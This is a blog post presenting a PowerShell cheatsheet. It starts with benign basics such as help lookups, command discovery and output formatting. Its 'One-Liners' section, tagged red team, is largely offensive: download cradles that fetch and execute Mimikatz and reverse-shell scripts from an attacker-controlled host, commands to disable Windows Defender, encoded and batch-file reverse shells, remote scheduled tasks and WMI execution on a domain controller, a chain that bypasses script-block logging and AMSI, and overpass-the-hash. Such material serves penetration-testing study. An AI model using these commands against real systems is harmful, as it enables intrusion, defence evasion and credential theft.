---
author:
  name: "Piyush Verma"
date: 2021-10-29
linktitle: PowerShell Cheatsheet
type:
- post
- posts
title: PowerShell Cheatsheet
draft: false
toc: true
images:
tags:
  - PowerShell
  - cheatsheet
  - oneliner
  - redteam
weight: 10
---
{{<image src="https://media.giphy.com/media/8Iv5lqKwKsZ2g/giphy.gif" alt="alt text" width="400" height="180" position="center">}} 

This cheatsheet will continue to receive updates. 

## PowerShell (PS) 101 commands
---

Please note that all of the following commands are run from a PowerShell prompt.

Retrieve the PowerShell version
```powershell
 $PSVersionTable 
 ```

List help about a cmdlet in a readable format
```powershell 
Get-Help <cmdlet> | more
```

List cmdlets which contain the keyword 'service' in them
```powershell
Get-Command -CommandType Cmdlet | ?{$_.Name -match "service"}
```
List available commands in the current PS session and their respective details which contain the keyword 'command' in them:
```powershell
Get-Command -CommandType All -ShowCommandInfo | ?{$_.Name -match "command"}
```

Wildcards can be used to match as well. 
```powershell
Get-Command -CommandType All | ?{$_.Name -match "serv*"}
```

Count the number of commands in the output 
```powershell
(Get-Command -CommandType All | ?{$_.Name -match "command"}).count
```

List all cmdlets with PKI as source
```powershell
Get-Command -CommandType Cmdlet | ?{$_.Source -match "PKI"}
```

List available commands in a module by running
```powershell
Get-Command -Module <module name>
```

## Handy Tweaks
---

When you launch PowerShell session, it opens in the user's home directory by default. This behavior can be modified so that new PS sessions open in a custom directory. Here is how:

```powershell
# Check the value of $PROFILE variable.

PS C:\Windows\system32> $PROFILE
C:\Users\XXXXXXXXX\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1

# Create the .ps1 file returned from the $PROFILE variable

PS C:\Windows\system32> New-Item -Path $PROFILE -Type File -Force

# To set and change the default working directory, open the above 'Microsoft.PowerShell_profile.ps1' in ISE and add the following line with your desired path.

Set-location <Custom directory path>
```


## One-Liners
---

### Creating a firewall rule exception in Windows
```powershell
New-NetFirewallRule -DisplayName 'HTTP-Inbound' -Profile @('Domain', 'Private') -Direction Inbound -Action Allow -Protocol TCP -LocalPort @('80', '443')

New-NetFirewallRule -DisplayName '447-Inbound' -Profile @('Domain', 'Private') -Direction Inbound -Action Allow -Protocol TCP -LocalPort @('447')
```

### Download cradles
```powershell
# Option 1 - Using IEX (compatible with older versions of PS)

powershell iex (New-Object Net.WebClient).DownloadString("http://192.168.X.X/Invoke-MimikatzEX.ps1")

# Option 2 - Using IWR (works on current version of PS)

iwr -UseBasicparsing http://192.168.X.X/Invoke-PowerShellRev.ps1 | iex
```

### Creating a Credential object
```powershell
$SecPassword = ConvertTo-SecureString 'XXXXXXXXXXXX' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('domain\user', $SecPassword)

```

### Decode Base64
```powershell
$EncodedText = “VABoA....”

$DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))

$DecodedText
```

### Disable AV
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true

Set-MpPreference -DisableIOAVProtection $true
```
### Encode reverse shell
```powershell
. .\Invoke-Encode.ps1

Invoke-Encode -DataToEncode .\Invoke-PowerShellTcpOneLine.ps1 -OutCommand

# Open a listener (nc) on one end and on another shell use: 

powershell -e <content of encodedcommand.txt>
```

### Reverse shell using a Batch file
```powershell
# Create reverse.bat file

$Contents = 'powershell.exe -c iex ((New-Object Net.WebClient).DownloadString(''http://192.168.X.X/Invoke-PowerShellRev8080.ps1''))'
Out-File -Encoding Ascii -InputObject $Contents -FilePath C:\...\Tools\reverse8080.bat

# Call reverse.bat file

## Option 1
.rotten.exe * reverse.bat

## Option 2
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:srv.contoso.local /ntlm:<NTLMHASH> /run:C:\users\.....\desktop\reverse.bat"'
```

### Scheduled tasks
```powershell
schtasks /create /S dc.contoso.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "UserX" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.X.X/Invoke-PowerShellRev8080.ps1''')'"

schtasks /Run /S dc.contoso.local /TN "UserX"
```

### Invoke-WMIMethod - Command Execution (Reverse shell, etc.)
```powershell
Invoke-WmiMethod win32_process -ComputerName dc.contoso.local -name create -argumentlist "powershell.exe -e $encodedCommand"
```

### Chain powershell commands to Bypass SBLogging, then AMSIBypass and then get reverse shell
```powershell
powershell -c "iex (iwr -UseBasicParsing http://192.168.X.X/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.X.X/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.X.X/Invoke-PowerShellTcpEx.ps1)
```

### Check local admin access via Invoke-Command
```powershell
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName (Get-Content ..\Output\computers.txt) 2>$null
```

### Over pass-the-hash
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:srv.contoso.local /ntlm:<NTLMHASH> /run:powershell.exe"'
```

## Playing with command output
---

### 1. Expand redacted output

You might notice that sometimes the output returned by PS commands is redacted with "...". This can be corrected by modifying the value of the PS variable - ```$FormatEnumerationLimit``` as follows.

``` powershell
$FormatEnumerationLimit = -1
```

### 2. Using 'more' command

Piping output of a command to ``` more ``` command makes it readable from the first line. This is equivalent to ``` less``` command in Linux/Unix.

``` powershell
Get-Process | more
```

### 3. Using -ExpandProperty

``` powershell
Get-CimClass -Namespace root/SecurityCenter2 -MethodName * | select -ExpandProperty CimClassMethods
```

### 4. Exporting output in a CSV format

Sometimes (more than we'd think) having the output in a CSV file is a blessing. Here is how it can be done using ```Export-CSV``` cmdlet.

``` powershell
Get-Date | Select-Object -Property DateTime, Day, DayOfWeek, DayOfYear | Export-Csv -Path .\DateTime.csv -NoTypeInformation
```